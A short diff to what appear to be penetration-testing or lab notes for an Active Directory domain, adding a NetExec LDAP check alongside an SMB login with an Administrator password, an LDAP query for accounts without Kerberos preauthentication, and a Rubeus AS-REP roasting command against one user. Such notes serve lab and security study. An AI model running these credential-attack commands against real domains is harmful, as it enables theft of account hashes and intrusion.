@@ -16,6 +16,10 @@ smbclientng -u Administrator -p "admin123;" -d medicare.local --host medicare.lo
 
 sa-ldapsearch (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
 
+or use for check if it asreproast
+
+nxc ldap medicare.local -u "allegra.dosi" -p "" -k
+
 ## use rubeus for asreproast
 
 rubeus asreproast /user:allegra.dosi /domain:medicare.local /dc:medicare.local
